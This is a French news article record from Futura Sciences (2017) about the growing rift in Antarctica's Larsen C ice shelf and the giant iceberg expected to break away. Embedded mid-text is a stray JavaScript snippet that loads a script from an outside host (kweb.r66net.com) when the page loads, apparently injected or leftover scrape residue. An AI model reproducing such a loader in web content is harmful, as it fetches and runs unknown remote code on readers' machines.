{"title": "En Antarctique, un iceberg geant est sur le point de se detacher", "newspaper": "Futura Sciences", "author": ["Nathalie Mayer"], "date_publi": "2017-06-06", "content": "Une etendue de glace de pres de 50 fois la superficie de Paris est sur le point de se detacher de l'Antarctique. L'un des plus grands icebergs jamais enregistres pourrait alors se retrouver a voguer sur les flots. De quoi rendre plus vulnerable que jamais la barriere de glace de Larsen C. Jeudi 1 er  juin2017, par une ironie du sort, alors que Donald Trump annonce le retrait des Etats-Unis de l' accord de Paris , des chercheurs britanniques de l' universite de Swansea  revelent des donnees satellites montrant un phenomene exceptionnel. La  faille  gigantesque qui fissure la  barriere de glace  de Larsen C, a l'ouest de l' Antarctique , s'est allongee de pas moins de 17 kilometres en seulement 6 jours. Et elle menace desormais de liberer dans l'ocean un  iceberg geant . Le pan de glace en effet n'est plus relie au continent que sur 13 petits kilometres. Si la crevasse continue a progresser a ce rythme, d'un jour a l'autre, c'est un iceberg de plus de 5.000 km 2  de superficie -- et pas moins de 350 m d'epaisseur -- qui se detachera, assurent les scientifiques. Ici, une illustration montrant l'evolution de la faille qui fissure la barriere de glace de Larsen C. Au 31 mai 2017, seuls 13 kilometres la separaient de l'ocean. En haut a droite, une carte du Pays de Galles ( Wales ), a la meme echelle, pour comparaison de taille... (c)  Midas Project ,  University of Swansea                               Une menace pour le niveau des eaux Rappelons qu'une barriere de glace -- encore appelee plateforme glaciaire -- comme celle de Larsen C est une epaisse etendue de glace flottant sur l'eau. Elle se forme lorsqu'un glacier rejoint la cote et poursuit son extension sur la mer. Et celle de larsen C est la plus septentrionale de l' Antarctique . Emettre un iceberg de cette taille, reviendrait a lui faire perdre un dixieme de sa superficie totale.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  En soi, toutefois, pas de quoi menacer le niveau des eaux. Car la glace en question reste accrochee, pour l'instant, au continent. Mais l'enorme barriere de glace de Larsen C retient, quelque sorte, les  glaciers du nord de l'Antarctique . Sans elle, et apres la desintegration des plaques Larsen A et B, expliquent les chercheurs, la couverture de glace sera moins stable. Si elle venait a disparaitre, ces glaciers se retrouveraient exposes a l'ocean. Et le monde risquerait alors une montee des eaux de pas moins de 10 centimetres ! Pour en savoir plus Antarctique : une faille spectaculaire entaille une plateforme glaciaire sur 110 km Article de Laurent Sacco republie le 06/05/2017 Les plateformes glaciaires se forment et se brisent regulierement en Antarctique en creant de grands icebergs tabulaires. Celles issues de la << famille Larsen >> sont particulierement instables en raison du  rechauffement climatique . Recemment, des chercheurs ont repere sur l'une d'elles une nouvelle fracture longue d'une quinzaine de kilometres. Mais fin 2016, ils avaient deja decouvert une faille profonde et longue de plus de 110 km. Aujourd'hui, elle n'en mesurerait deja pas moins de 180 et pourrait donner naissance au plus grand iceberg du monde... Article paru le 08/12/2016 Il y a quelques annees, la desintegration de la  plateforme glaciaire Larsen B  en Antarctique avait deja fait parler d'elle car elle representait une illustration frappante de l'effet du rechauffement climatique. Rappelons qu'une plateforme glaciaire, encore appelee barriere de glace, est tres generalement une portion d' inlandsis  qui s'ecoule et s'etend sur l'ocean en bordure de l'Antarctique, du Groenland et dans l' archipel  arctique canadien.  Parfois, il peut s'agir aussi d'une portion de  banquise , donc d'eau de mer gelee, recouverte d'une couche de neige compactee. Les plateformes glaciaires sont destinees a subir le  velage  et des icebergs tabulaires s'en detachent donc periodiquement au bout de quelques annees ou decennies. La dislocation de la barriere glaciaire Larsen B. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais devraient alors apparaitre. Cliquez ensuite sur l'ecrou a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c) Nasa, JPL Une faille de 110 km de long et 530 m de profondeur Certaines barrieres glaciaires peuvent rester stables durant plusieurs milliers d'annees, mais cette persistance est rare. En contact a la fois avec l'ocean et l' atmosphere , elles sont particulierement sensibles aux variations d'un  changement climatique  auxquelles elles repondent en general assez vite. C'est le cas, depuis une vingtaine d'annees, des plateformes glaciaires disparues Larsen A et B. Elles constituent deux des trois segments de la barriere de Larsen associes a trois baies distinctes s'etendant le long de la cote orientale de la  peninsule  Antarctique. La faille de Larsen C, une barriere glaciaire en bordure de la peninsule Antarctique, est spectaculaire avec ses 110 km de long et ses 90 m de large. Mais elle n'occupe qu'une petite partie de la calotte polaire. (c) Nasa                               La Nasa observe les barrieres glaciaires dans le cadre de la  mission IceBridge  debutee en 2009. Le 10 novembre 2016, ce suivi a permis de detecter une faille spectaculaire de plus de 110 km de long, 530 m de profondeur et 90 m de large entaillant la plateforme glaciaire Larsen C. A l'echelle du continent Antarctique, dont la taille est d'environ 5.500 km et qui est donc 50 fois plus etendu, ce n'est nullement preoccupant, meme si cela traduit une fois de plus la menace que fait peser sur l'Antarctique le rechauffement climatique en cours. On doit en tout cas s'attendre dans un futur proche, mais encore indetermine, a ce qu'un iceberg de la taille d'un departement, de l'ordre de celui de la Drome, se detache de la plateforme Larsen C. Une impressionnante chute d'iceberg de la taille de Manhattan                       Adam Lewinter et Jeff Orlowski ont filme une rupture historique sur le glacier de Sermeq Kujalleq, au Groenland. L'evenement a dure 75 minutes et le glacier s'est retire de plus de 1,6 km. Un impressionnant spectacle a decouvrir en video.                                       ", "theme": "planete"}